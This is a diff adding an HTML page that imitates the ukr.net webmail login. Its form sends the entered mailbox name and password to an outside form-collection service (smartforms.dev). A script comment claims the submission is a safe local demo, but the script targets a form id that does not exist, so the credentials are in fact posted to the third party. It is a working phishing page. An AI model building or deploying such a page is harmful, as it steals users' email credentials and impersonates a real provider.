@@ -1,0 +1,617 @@
+<!doctype html>
+<html lang="uk">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>Пошта @ ukr.net - українська електронна пошта • Створи емейл</title>
+
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    :root {
+      --main-image-width: 460px;
+      --main-image-height: 100px;
+      --second-image-width: 460px;
+      --second-image-height: 350px;
+      --left-position: 30px;
+      --top-position: 30px;
+      --green: #669900;
+      --dark-green: #527b00;
+      --dark-text: #242a32;
+    }
+
+    html {
+      min-width: 320px;
+    }
+
+    body {
+      margin: 0;
+      min-height: 100vh;
+      font-family: Arial, sans-serif;
+      color: var(--dark-text);
+      background: #f5f7f2;
+    }
+
+    .page {
+      width: min(1200px, 94%);
+      margin: 0 auto;
+      padding: 30px 0;
+    }
+
+    .login-wrapper {
+      display: flex;
+      align-items: flex-start;
+      justify-content: center;
+      gap: 70px;
+    }
+
+    /* IMAGE AREA */
+
+    .image-side {
+      position: relative;
+      top: var(--top-position);
+      left: var(--left-position);
+      width: 460px;
+      flex-shrink: 0;
+    }
+
+    .main-image {
+      display: block;
+      width: var(--main-image-width);
+      height: var(--main-image-height);
+      object-fit: cover;
+      object-position: center;
+      border-radius: 10px;
+      background: #e8e8e8;
+      box-shadow: 0 5px 18px rgba(0, 0, 0, .15);
+    }
+
+    .second-image {
+      display: block;
+      width: var(--second-image-width);
+      height: var(--second-image-height);
+      object-fit: cover;
+      object-position: center;
+      margin-top: 22px;
+      border-radius: 10px;
+      background: #e8e8e8;
+      box-shadow: 0 5px 18px rgba(0, 0, 0, .12);
+      opacity: 1;
+      transition: opacity .5s ease;
+    }
+
+    .second-image.fade {
+      opacity: 0;
+    }
+
+    /* IMAGE DOTS */
+
+    .image-dots {
+      display: flex;
+      justify-content: center;
+      gap: 10px;
+      margin-top: 14px;
+    }
+
+    .image-dot {
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+      background: #d2d5d0;
+    }
+
+    .image-dot.active {
+      background: var(--green);
+    }
+
+    /* LOGIN FORM */
+
+    .form-column {
+      width: 510px;
+      flex-shrink: 0;
+    }
+
+    .card {
+      width: 100%;
+      padding: 50px;
+      border-radius: 12px;
+      background: #fff;
+      box-shadow: 0 5px 25px rgba(0, 0, 0, .12);
+    }
+
+    h1 {
+      margin: 0 0 22px;
+      text-align: left;
+      font-size: 24px;
+    }
+
+    label {
+      display: block;
+      margin: 15px 0 8px;
+      font-weight: 600;
+    }
+
+    input[type="email"],
+    input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      background: #fff;
+      color: #222;
+      font-size: 16px;
+    }
+
+    input:focus {
+      outline: none;
+      border-color: var(--green);
+      box-shadow: 0 0 0 3px rgba(102, 153, 0, .12);
+    }
+
+    .computer-option {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      margin-top: 14px;
+      font-size: 14px;
+      font-weight: normal;
+      cursor: pointer;
+    }
+
+    .computer-option input {
+      width: 17px;
+      height: 17px;
+      margin: 0;
+      accent-color: var(--green);
+      cursor: pointer;
+    }
+
+    .login-button {
+      width: 100%;
+      margin-top: 20px;
+      padding: 12px;
+      border: 0;
+      border-radius: 6px;
+      background: var(--green);
+      color: #fff;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+    }
+
+    .login-button:hover {
+      background: var(--dark-green);
+    }
+
+    #message {
+      min-height: 20px;
+      margin-top: 16px;
+      text-align: center;
+      font-size: 14px;
+    }
+
+    /* GOOGLE PLAY AND APP STORE */
+
+    .apps-section {
+      width: 100%;
+      margin-top: 14px;
+      text-align: left;
+      transform: translateY(-8px);
+    }
+
+    .apps-title {
+      margin-bottom: 8px;
+      color: #333;
+      font-size: 13px;
+      font-weight: 600;
+      text-align: left;
+    }
+
+    .app-buttons {
+      display: flex;
+      justify-content: flex-start;
+      gap: 8px;
+    }
+
+    .app-button {
+      min-width: 135px;
+      min-height: 42px;
+      padding: 6px 12px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      border-radius: 5px;
+      background: #20242a;
+      color: #fff;
+      text-decoration: none;
+      box-shadow: 0 2px 5px rgba(0, 0, 0, .15);
+    }
+
+    .app-button:hover {
+      background: #101216;
+    }
+
+    .app-symbol {
+      font-size: 21px;
+    }
+
+    .app-small {
+      display: block;
+      font-size: 8px;
+      text-align: left;
+    }
+
+    .app-name {
+      display: block;
+      margin-top: 2px;
+      font-size: 14px;
+      font-weight: 600;
+      text-align: left;
+    }
+
+    /* FOOTER */
+
+    .site-footer {
+      display: block;
+      width: 100%;
+      margin-top: 70px;
+      padding: 25px 20px 35px;
+      border-top: 1px solid #d8ddd3;
+    }
+
+    .support-bottom {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-wrap: wrap;
+      gap: 22px 38px;
+    }
+
+    .support-bottom a {
+      display: inline-flex;
+      align-items: center;
+      gap: 7px;
+      color: #333;
+      font-size: 13px;
+      text-decoration: none;
+    }
+
+    .support-bottom a:hover {
+      color: var(--green);
+      text-decoration: underline;
+    }
+
+    .footer-icon {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      width: 20px;
+      height: 20px;
+      border: 1px solid #aab1a5;
+      border-radius: 50%;
+      color: var(--green);
+      font-size: 12px;
+      font-weight: bold;
+    }
+
+    /* TABLET */
+
+    @media (max-width: 1000px) {
+      .login-wrapper {
+        gap: 35px;
+      }
+
+      .image-side {
+        width: 360px;
+      }
+
+      .main-image,
+      .second-image {
+        width: 360px;
+        height: 180px;
+      }
+
+      .form-column {
+        width: 420px;
+      }
+    }
+
+    /* MOBILE */
+
+    @media (max-width: 700px) {
+      .page {
+        padding-top: 20px;
+      }
+
+      .login-wrapper {
+        flex-direction: column;
+        align-items: center;
+        gap: 30px;
+      }
+
+      .image-side {
+        width: 100%;
+        top: 0;
+        left: 0;
+        text-align: center;
+      }
+
+      .main-image,
+      .second-image {
+        width: min(460px, 100%);
+        height: auto;
+        aspect-ratio: 16 / 9;
+        margin-right: auto;
+        margin-left: auto;
+      }
+
+      .form-column {
+        width: min(440px, 100%);
+      }
+
+      .apps-section {
+        transform: none;
+      }
+
+      .site-footer {
+        margin-top: 45px;
+      }
+
+      .support-bottom {
+        flex-direction: column;
+        gap: 18px;
+      }
+    }
+
+    @media (max-width: 430px) {
+      .app-buttons {
+        flex-direction: column;
+        align-items: flex-start;
+      }
+
+      .app-button {
+        width: 155px;
+      }
+    }
+  </style>
+</head>
+
+<body>
+
+  <main class="page">
+
+    <div class="login-wrapper">
+
+      <!-- IMAGE SECTION -->
+
+      <div class="image-side">
+
+        <img
+          class="main-image"
+          src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSyhvFtDV3LsQa_-tlAirYNLGiahxV1CkLAaCAfhvIn0w&s=10"
+          alt="Application image"
+        >
+
+        <img
+          id="changingImage"
+          class="second-image"
+          src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQFvAoZf8U3FgrklKDlCX46avOI_07mk1alTS3NJvwySA&s"
+          alt="Supporting illustration"
+        >
+
+        <div class="image-dots" aria-hidden="true">
+          <span class="image-dot active"></span>
+          <span class="image-dot"></span>
+          <span class="image-dot"></span>
+          <span class="image-dot"></span>
+          <span class="image-dot"></span>
+        </div>
+
+      </div>
+
+      <!-- LOGIN FORM AND APPLICATION BUTTONS -->
+
+      <div class="form-column">
+
+        <section class="card">
+
+          <h1>Пошта</h1>
+
+         
+          <form action="https://smartforms.dev/submit/6af1bd4dc184545ccc232cf7" method="POST">
+
+            <label for="email">
+              Ім'я скриньки
+            </label>
+
+<input
+              id="email"
+              name="email"
+              type="email"
+              autocomplete="username"
+              placeholder="ім'я@ukr.net"
+              required
+            >
+
+            <label for="password">
+              Пароль
+            </label>
+
+            <input
+              id="password"
+              name="password"
+              type="password"
+              autocomplete="current-password"
+              placeholder="Пароль"
+              required
+            >
+
+            <label class="computer-option">
+
+              <input
+                type="checkbox"
+                name="other_computer"
+                value="1"
+              >
+
+              Чужий комп'ютер
+
+            </label>
+
+            <button class="login-button" type="submit">
+              Увійти
+            </button>
+
+            <div id="message" aria-live="polite"></div>
+
+          </form>
+
+        </section>
+
+        <!-- GOOGLE PLAY AND APP STORE -->
+
+        <div class="apps-section">
+
+          <div class="apps-title">
+            Наші офіційні застосунки!
+          </div>
+
+          <div class="app-buttons">
+
+            <a class="app-button" href="#">
+              <span class="app-symbol">▶</span>
+
+              <span>
+                <span class="app-small">
+                  ЗАВАНТАЖИТИ В
+                </span>
+
+                <span class="app-name">
+                  Google Play
+                </span>
+              </span>
+            </a>
+
+            <a class="app-button" href="#">
+              <span class="app-symbol">●</span>
+
+              <span>
+                <span class="app-small">
+                  ЗАВАНТАЖИТИ В
+                </span>
+
+                <span class="app-name">
+                  App Store
+                </span>
+              </span>
+            </a>
+
+          </div>
+
+        </div>
+
+      </div>
+
+    </div>
+
+    <!-- VISIBLE FOOTER -->
+
+    <footer class="site-footer">
+
+      <div class="support-bottom">
+
+        <a href="#">
+          <span class="footer-icon">?</span>
+          Підтримка
+        </a>
+
+        <a href="/privacy">
+          <span class="footer-icon">▣</span>
+          Політика конфіденційності
+        </a>
+
+        <a href="/terms">
+          <span class="footer-icon">i</span>
+          Умови використання
+        </a>
+
+        <a href="mailto:support@example.com">
+          <span class="footer-icon">✉</span>
+          Зв’яжіться з нами
+        </a>
+
+      </div>
+
+    </footer>
+
+  </main>
+
+  <script>
+    const images = [
+      "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQFvAoZf8U3FgrklKDlCX46avOI_07mk1alTS3NJvwySA&s",
+      "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSlhOCSaXG6MQzGnGE85u_wc_Bu-zHnBR9H7hbAbtoGQg&s",
+      "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQTT4dUGdbfQeJhzUPSl1Xpb_NvMSkg0xwuHIflinIiKg&s",
+      "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTBw_CiaAujcxLPvVWs7E9JqI7kZVDxekinY574v-5K5g&s",
+      "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRQTeMnkhrPwDyFfvShwti7tohnAz_wse4G0aVZEVPoUQ&s"
+    ];
+
+    const changingImage =
+      document.getElementById("changingImage");
+
+    const imageDots =
+      document.querySelectorAll(".image-dot");
+
+    let currentImage = 0;
+
+    images.forEach(function (image) {
+      const preload = new Image();
+      preload.src = image;
+    });
+
+    setInterval(function () {
+      let nextImage;
+
+      do {
+        nextImage =
+          Math.floor(Math.random() * images.length);
+      } while (
+        nextImage === currentImage &&
+        images.length > 1
+      );
+
+      changingImage.classList.add("fade");
+
+      setTimeout(function () {
+        currentImage = nextImage;
+        changingImage.src = images[currentImage];
+
+        imageDots.forEach(function (dot, index) {
+          dot.classList.toggle(
+            "active",
+            index === currentImage
+          );
+        });
+
+        changingImage.classList.remove("fade");
+      }, 500);
+
+    }, 2500);
+
+    /* SAFE LOCAL DEMO SUBMISSION */
+
+    const demoForm = document.getElementById("demoForm");
+    const message = document.getElementById("message");
+
+    demoForm.addEventListener("submit", function (event) {
+      event.preventDefault();
+      message.textContent = "Демонстраційна форма працює локально.";
+    });
+  </script>
+
+</body>
+</html>
